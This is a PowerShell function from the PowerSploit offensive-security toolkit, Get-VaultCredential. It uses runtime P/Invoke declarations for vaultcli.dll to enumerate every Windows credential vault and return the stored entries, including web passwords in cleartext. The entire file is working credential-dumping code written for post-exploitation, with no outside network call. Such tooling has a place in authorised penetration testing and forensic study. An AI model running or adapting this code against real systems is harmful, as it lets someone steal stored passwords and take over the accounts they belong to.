function Get-VaultCredential
{
<#
.SYNOPSIS

Displays Windows vault credential objects including cleartext web credentials.

PowerSploit Function: Get-VaultCredential
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Get-VaultCredential enumerates and displays all credentials stored in the Windows
vault. Web credentials, specifically are displayed in cleartext. This script was
inspired by the following C implementation: http://www.oxid.it/downloads/vaultdump.txt

.EXAMPLE

Get-VaultCredential

.NOTES

Only web credentials can be displayed in cleartext.
#>
    [CmdletBinding()] Param()

    $OSVersion = [Environment]::OSVersion.Version
    $OSMajor = $OSVersion.Major
    $OSMinor = $OSVersion.Minor

    #region P/Invoke declarations for vaultcli.dll
    $DynAssembly = New-Object System.Reflection.AssemblyName('VaultUtil')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('VaultUtil', $False)

    $EnumBuilder = $ModuleBuilder.DefineEnum('VaultLib.VAULT_ELEMENT_TYPE', 'Public', [Int32])
    $null = $EnumBuilder.DefineLiteral('Undefined', -1)
    $null = $EnumBuilder.DefineLiteral('Boolean', 0)
    $null = $EnumBuilder.DefineLiteral('Short', 1)
    $null = $EnumBuilder.DefineLiteral('UnsignedShort', 2)
    $null = $EnumBuilder.DefineLiteral('Int', 3)
    $null = $EnumBuilder.DefineLiteral('UnsignedInt', 4)
    $null = $EnumBuilder.DefineLiteral('Double', 5)
    $null = $EnumBuilder.DefineLiteral('Guid', 6)
    $null = $EnumBuilder.DefineLiteral('String', 7)
    $null = $EnumBuilder.DefineLiteral('ByteArray', 8)
    $null = $EnumBuilder.DefineLiteral('TimeStamp', 9)
    $null = $EnumBuilder.DefineLiteral('ProtectedArray', 10)
    $null = $EnumBuilder.DefineLiteral('Attribute', 11)
    $null = $EnumBuilder.DefineLiteral('Sid', 12)
    $null = $EnumBuilder.DefineLiteral('Last', 13)
    $VAULT_ELEMENT_TYPE = $EnumBuilder.CreateType()

    $EnumBuilder = $ModuleBuilder.DefineEnum('VaultLib.VAULT_SCHEMA_ELEMENT_ID', 'Public', [Int32])
    $null = $EnumBuilder.DefineLiteral('Illegal', 0)
    $null = $EnumBuilder.DefineLiteral('Resource', 1)
    $null = $EnumBuilder.DefineLiteral('Identity', 2)
    $null = $EnumBuilder.DefineLiteral('Authenticator', 3)
    $null = $EnumBuilder.DefineLiteral('Tag', 4)
    $null = $EnumBuilder.DefineLiteral('PackageSid', 5)
    $null = $EnumBuilder.DefineLiteral('AppStart', 100)
    $null = $EnumBuilder.DefineLiteral('AppEnd', 10000)
    $VAULT_SCHEMA_ELEMENT_ID = $EnumBuilder.CreateType()

    $LayoutConstructor = [Runtime.InteropServices.StructLayoutAttribute].GetConstructor([Runtime.InteropServices.LayoutKind])
    $CharsetField = [Runtime.InteropServices.StructLayoutAttribute].GetField('CharSet')
    $StructLayoutCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($LayoutConstructor,
                                                                                     @([Runtime.InteropServices.LayoutKind]::Explicit),
                                                                                     $CharsetField,
                                                                                     @([Runtime.InteropServices.CharSet]::Ansi))
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.VAULT_ITEM', $StructAttributes, [Object], [System.Reflection.Emit.PackingSize]::Size4)
    $null = $TypeBuilder.DefineField('SchemaId', [Guid], 'Public')
    $null = $TypeBuilder.DefineField('pszCredentialFriendlyName', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pResourceElement', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pIdentityElement', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pAuthenticatorElement', [IntPtr], 'Public')
    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
    {
        $null = $TypeBuilder.DefineField('pPackageSid', [IntPtr], 'Public')
    }
    $null = $TypeBuilder.DefineField('LastModified', [UInt64], 'Public')
    $null = $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public')
    $null = $TypeBuilder.DefineField('dwPropertiesCount', [UInt32], 'Public')
    $null = $TypeBuilder.DefineField('pPropertyElements', [IntPtr], 'Public')
    $VAULT_ITEM = $TypeBuilder.CreateType()

    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.VAULT_ITEM_ELEMENT', $StructAttributes)
    $TypeBuilder.SetCustomAttribute($StructLayoutCustomAttribute)
    $null = $TypeBuilder.DefineField('SchemaElementId', $VAULT_SCHEMA_ELEMENT_ID, 'Public').SetOffset(0)
    $null = $TypeBuilder.DefineField('Type', $VAULT_ELEMENT_TYPE, 'Public').SetOffset(8)
    $VAULT_ITEM_ELEMENT = $TypeBuilder.CreateType()


    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.Vaultcli', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultOpenVault',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Guid].MakeByRefType(),
                                                                 [UInt32],
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultCloseVault',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultFree',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr]),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultEnumerateVaults',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultEnumerateItems',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr],
                                                                 [Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
    {
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultGetItem',
                                                          'vaultcli.dll',
                                                          'Public, Static',
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }
    else
    {
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultGetItem',
                                                          'vaultcli.dll',
                                                          'Public, Static',
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }

    $Vaultcli = $TypeBuilder.CreateType()
    #endregion

    # Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct.
    function local:Get-VaultElementValue
    {
        Param (
            [ValidateScript({$_ -ne [IntPtr]::Zero})]
            [IntPtr]
            $VaultElementPtr
        )

        $PartialElement = [Runtime.InteropServices.Marshal]::PtrToStructure($VaultElementPtr, [Type] $VAULT_ITEM_ELEMENT)
        $ElementPtr = [IntPtr] ($VaultElementPtr.ToInt64() + 16)

        switch ($PartialElement.Type)
        {
            $VAULT_ELEMENT_TYPE::String {
                $StringPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] $ElementPtr)
                [Runtime.InteropServices.Marshal]::PtrToStringUni([IntPtr] $StringPtr)
            }

            $VAULT_ELEMENT_TYPE::Boolean {
                [Bool] [Runtime.InteropServices.Marshal]::ReadByte([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Short {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::UnsignedShort {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Int {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::UnsignedInt {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Double {
                [Runtime.InteropServices.Marshal]::PtrToStructure($ElementPtr, [Type] [Double])
            }

            $VAULT_ELEMENT_TYPE::Guid {
                [Runtime.InteropServices.Marshal]::PtrToStructure($ElementPtr, [Type] [Guid])
            }

            $VAULT_ELEMENT_TYPE::Sid {
                $SidPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] $ElementPtr)
                Write-Verbose "0x$($SidPtr.ToString('X8'))"
                $SidObject = [Security.Principal.SecurityIdentifier] ([IntPtr] $SidPtr)
                $SidObject.Value
            }

            # These elements are currently unimplemented.
            # I have yet to see these used in practice.
            $VAULT_ELEMENT_TYPE::ByteArray { $null }
            $VAULT_ELEMENT_TYPE::TimeStamp { $null }
            $VAULT_ELEMENT_TYPE::ProtectedArray { $null }
            $VAULT_ELEMENT_TYPE::Attribute { $null }
            $VAULT_ELEMENT_TYPE::Last { $null }
        }
    }

    $VaultCount = 0
    $VaultGuidPtr = [IntPtr]::Zero
    $Result = $Vaultcli::VaultEnumerateVaults(0, [Ref] $VaultCount, [Ref] $VaultGuidPtr)

    if ($Result -ne 0)
    {
        throw "Unable to enumerate vaults. Error (0x$($Result.ToString('X8')))"
    }

    $GuidAddress = $VaultGuidPtr

    $VaultSchema = @{
        ([Guid] '2F1A6504-0641-44CF-8BB5-3612D865F2E5') = 'Windows Secure Note'
        ([Guid] '3CCD5499-87A8-4B10-A215-608888DD3B55') = 'Windows Web Password Credential'
        ([Guid] '154E23D0-C644-4E6F-8CE6-5069272F999F') = 'Windows Credential Picker Protector'
        ([Guid] '4BF4C442-9B8A-41A0-B380-DD4A704DDB28') = 'Web Credentials'
        ([Guid] '77BC582B-F0A6-4E15-4E80-61736B6F3B29') = 'Windows Credentials'
        ([Guid] 'E69D7838-91B5-4FC9-89D5-230D4D4CC2BC') = 'Windows Domain Certificate Credential'
        ([Guid] '3E0E35BE-1B77-43E7-B873-AED901B6275B') = 'Windows Domain Password Credential'
        ([Guid] '3C886FF3-2669-4AA2-A8FB-3F6759A77548') = 'Windows Extended Credential'
        ([Guid] '00000000-0000-0000-0000-000000000000') = $null
    }

    if ($VaultCount)
    {
        foreach ($i in 1..$VaultCount)
        {
            $VaultGuid = [Runtime.InteropServices.Marshal]::PtrToStructure($GuidAddress, [Type] [Guid])
            $GuidAddress = [IntPtr] ($GuidAddress.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] [Guid]))

            $VaultHandle = [IntPtr]::Zero

            Write-Verbose "Opening vault - $($VaultSchema[$VaultGuid]) ($($VaultGuid))"

            $Result = $Vaultcli::VaultOpenVault([Ref] $VaultGuid, 0, [Ref] $VaultHandle)

            if ($Result -ne 0)
            {
                Write-Error "Unable to open the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8')))"
                continue
            }

            $VaultItemCount = 0
            $VaultItemPtr = [IntPtr]::Zero

            $Result = $Vaultcli::VaultEnumerateItems($VaultHandle, 512, [Ref] $VaultItemCount, [Ref] $VaultItemPtr)

            if ($Result -ne 0)
            {
                $null = $Vaultcli::VaultCloseVault([Ref] $VaultHandle)
                Write-Error "Unable to enumerate vault items from the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8')))"
                continue
            }

            $StructAddress = $VaultItemPtr

            if ($VaultItemCount)
            {
                foreach ($j in 1..$VaultItemCount)
                {
                    $CurrentItem = [Runtime.InteropServices.Marshal]::PtrToStructure($StructAddress, [Type] $VAULT_ITEM)
                    $StructAddress = [IntPtr] ($StructAddress.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] $VAULT_ITEM))

                    $PasswordVaultItem = [IntPtr]::Zero

                    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
                    {
                        $Result = $Vaultcli::VaultGetItem($VaultHandle,
                                                          [Ref] $CurrentItem.SchemaId,
                                                          $CurrentItem.pResourceElement,
                                                          $CurrentItem.pIdentityElement,
                                                          $CurrentItem.pPackageSid,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] $PasswordVaultItem)
                    }
                    else
                    {
                        $Result = $Vaultcli::VaultGetItem($VaultHandle,
                                                          [Ref] $CurrentItem.SchemaId,
                                                          $CurrentItem.pResourceElement,
                                                          $CurrentItem.pIdentityElement,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] $PasswordVaultItem)
                    }

                    $PasswordItem = $null

                    if ($Result -ne 0)
                    {
                        Write-Error "Error occured retrieving vault item. Error (0x$($Result.ToString('X8')))"
                        continue
                    }
                    else
                    {
                        $PasswordItem = [Runtime.InteropServices.Marshal]::PtrToStructure($PasswordVaultItem, [Type] $VAULT_ITEM)
                    }

                    if ($VaultSchema.ContainsKey($VaultGuid))
                    {
                        $VaultType = $VaultSchema[$VaultGuid]
                    }
                    else
                    {
                        $VaultType = $VaultGuid
                    }

                    if ($PasswordItem.pAuthenticatorElement -ne [IntPtr]::Zero)
                    {
                        $Credential = Get-VaultElementValue $PasswordItem.pAuthenticatorElement
                    }
                    else
                    {
                        $Credential = $null
                    }

                    $PackageSid = $null

                    if ($CurrentItem.pPackageSid -and ($CurrentItem.pPackageSid -ne [IntPtr]::Zero))
                    {
                        $PackageSid = Get-VaultElementValue $CurrentItem.pPackageSid
                    }


                    $Properties = @{
                        Vault = $VaultType
                        Resource = if ($CurrentItem.pResourceElement) { Get-VaultElementValue $CurrentItem.pResourceElement } else { $null }
                        Identity = if ($CurrentItem.pIdentityElement) { Get-VaultElementValue $CurrentItem.pIdentityElement } else { $null }
                        PackageSid = $PackageSid
                        Credential = $Credential
                        LastModified = [DateTime]::FromFileTimeUtc($CurrentItem.LastModified)
                    }

                    $VaultItem = New-Object PSObject -Property $Properties
                    $VaultItem.PSObject.TypeNames[0] = 'VAULTCLI.VAULTITEM'

                    $VaultItem

                    $null = $Vaultcli::VaultFree($PasswordVaultItem)
                }
            }

            $null = $Vaultcli::VaultCloseVault([Ref] $VaultHandle)
        }
    }
}
